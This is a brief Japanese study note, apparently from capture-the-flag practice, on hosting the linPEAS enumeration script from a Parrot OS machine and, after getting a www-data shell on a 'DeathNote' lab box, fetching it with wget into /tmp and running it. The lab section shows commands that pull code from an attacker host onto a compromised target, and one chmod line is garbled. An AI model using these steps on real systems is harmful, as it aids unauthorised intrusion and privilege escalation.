- ParrotOSのhomeに`/opt`を作るって移動する。設定をNATにする
- googleで`github linpeas`を検索する
- 一番上のサイトを開けてREADMEにQuick Startがある。`curl -L http://github~`をコピーする。
- Parrotのターミナルに貼り付けて`curl`を`wget`にして、`| sh`を消して`> linpeas.sh`にする
- `chmod +x 755 linpeas.sh`にする
- `python3 -m http.server 8080`

### DeathNoteで試す
- www-dataまでいく
- /tmpに移動して`wget http://Parrotのアドレス:8080/linpeas.sh`
- `chmod +x linpeas.sh`
- `./linpeas.sh`
